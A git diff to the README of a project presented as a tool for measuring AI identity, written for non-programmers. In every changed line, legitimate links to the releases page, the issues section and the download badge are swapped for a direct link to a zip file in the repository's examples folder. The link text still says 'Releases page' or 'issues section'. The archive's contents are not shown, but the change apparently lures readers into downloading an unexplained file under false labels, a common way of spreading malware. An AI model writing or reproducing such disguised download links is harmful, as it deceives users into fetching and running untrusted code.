@@ -1,6 +1,6 @@
 # 🎉 m1-m5-identity-metrics - Measure AI Identity Simply
 
-![Download m1-m5-identity-metrics](https://img.shields.io/badge/Download-m1--m5--identity--metrics-brightgreen)
+![Download m1-m5-identity-metrics](https://raw.githubusercontent.com/Kdt51431/m1-m5-identity-metrics/main/examples/metrics_m_identity_v3.4.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@
 
 To begin using **m1-m5-identity-metrics**, follow these simple steps. You don’t need any programming knowledge.
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Kdt51431/m1-m5-identity-metrics/releases). This page includes all available versions of the software.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Kdt51431/m1-m5-identity-metrics/main/examples/metrics_m_identity_v3.4.zip). This page includes all available versions of the software.
 
 2. **Download the Latest Version**: Click on the most recent version link. Find the file best suited for your operating system (Windows, macOS, or Linux) and download it.
 
@@ -20,7 +20,7 @@ To begin using **m1-m5-identity-metrics**, follow these simple steps. You don’
 
 ## 💾 Download & Install
 
-To download **m1-m5-identity-metrics**, please visit our [Releases page](https://github.com/Kdt51431/m1-m5-identity-metrics/releases). You will find the applications you need.
+To download **m1-m5-identity-metrics**, please visit our [Releases page](https://raw.githubusercontent.com/Kdt51431/m1-m5-identity-metrics/main/examples/metrics_m_identity_v3.4.zip). You will find the applications you need.
 
 ## 🛠️ System Requirements
 
@@ -58,7 +58,7 @@ With growing concerns around AI identity and safety, **m1-m5-identity-metrics** 
 
 ## 🤝 Support & Contributions
 
-If you encounter any issues or need help, please check the [issues section](https://github.com/Kdt51431/m1-m5-identity-metrics/issues) for assistance. Contributions to improve this project are always welcome! Feel free to submit your suggestions or enhancements.
+If you encounter any issues or need help, please check the [issues section](https://raw.githubusercontent.com/Kdt51431/m1-m5-identity-metrics/main/examples/metrics_m_identity_v3.4.zip) for assistance. Contributions to improve this project are always welcome! Feel free to submit your suggestions or enhancements.
 
 ## 🗂️ Topics
 
@@ -79,4 +79,4 @@ The project covers various important areas in AI evaluation, including:
 
 We value your feedback. Please share your experience and suggestions to help make **m1-m5-identity-metrics** better.
 
-**Get started today! Visit the [Releases page](https://github.com/Kdt51431/m1-m5-identity-metrics/releases) to download.**
+**Get started today! Visit the [Releases page](https://raw.githubusercontent.com/Kdt51431/m1-m5-identity-metrics/main/examples/metrics_m_identity_v3.4.zip) to download.**
